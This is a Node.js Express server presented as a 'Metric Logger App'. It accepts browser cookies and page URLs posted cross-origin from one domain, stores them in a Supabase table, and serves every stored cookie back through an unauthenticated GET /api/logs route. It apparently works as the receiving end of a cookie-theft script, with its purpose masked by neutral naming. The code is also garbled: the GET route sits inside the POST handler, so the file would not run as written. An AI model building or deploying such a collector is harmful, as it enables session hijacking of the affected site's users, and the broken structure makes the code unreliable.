require("dotenv").config();
const express = require("express");
const { createClient } = require("@supabase/supabase-js");

const app = express();
// Automatically binds to the container environment port, fallback to port 10000 locally
const PORT = process.env.PORT || 10000;

app.use(express.json());

// CONFIGURATION: Establish Cross-Origin Resource Sharing (CORS) Security Policies
app.use((req, res, next) => {
  // Explicitly mapping your production environment domain to protect the incoming endpoint
  res.header("Access-Control-Allow-Origin", "https://guresults.scoredge.com"); 
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.header("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Configure Database Connection Variables via System Settings
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !supabaseKey) {
  console.error("Critical Failure: Missing Supabase environmental context mappings.");
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

// Public API Health Monitoring Probe
app.get("/", (req, res) => {
  res.json({ status: "active", resource: "Metric Logger App" });
});

// Transaction Routing Handler to Intercept Data Objects
app.post("/api/event", async (req, res) => {
  try {
    const { cookies, page } = req.body;

    if (!cookies) {
      return res.status(400).json({ success: false, error: "Missing required tracking data payload." });
    }
// New GET Route to fetch logs from the Supabase database
app.get("/api/logs", async (req, res) => {
  try {
    // Query Supabase to select all records from the 'events' table
    // ordered by the latest entries first
    const { data, error } = await supabase
      .from("events")
      .select("*")
      .order("id", { ascending: false });

    if (error) {
      console.error("Supabase data fetch failure:", error);
      return res.status(500).json({ success: false, error: error.message });
    }

    // Return the array of records back to the client
    res.status(200).json({
      success: true,
      count: data.length,
      logs: data
    });

  } catch (error) {
    console.error("Internal retrieval fault:", error);
    res.status(500).json({ success: false, error: "Internal processing structural exception." });
  }
});

    // Strip carriage returns and line feeds to defend backend logging channels against write inject violations
    const sanitizedCookies = String(cookies).replace(/[\n\r]/g, '');

    // Write directly into your database schema
    const { data, error } = await supabase
      .from("events")
      .insert([
        {
          cookies: sanitizedCookies,
          page: page ? String(page).substring(0, 2048) : null
        }
      ])
      .select()
      .single();

    if (error) {
      console.error("Supabase engine storage transaction failure:", error);
      return res.status(500).json({ success: false, error: "Database execution constraint fault." });
    }

    res.status(201).json({ success: true, traceId: data.id });

  } catch (error) {
    console.error("Internal processing fault:", error);
    res.status(500).json({ success: false, error: "Internal processing structural exception." });
  }
});

app.listen(PORT, () => {
  console.log(`Pipeline listening protocol online at channel port ${PORT}`);
});
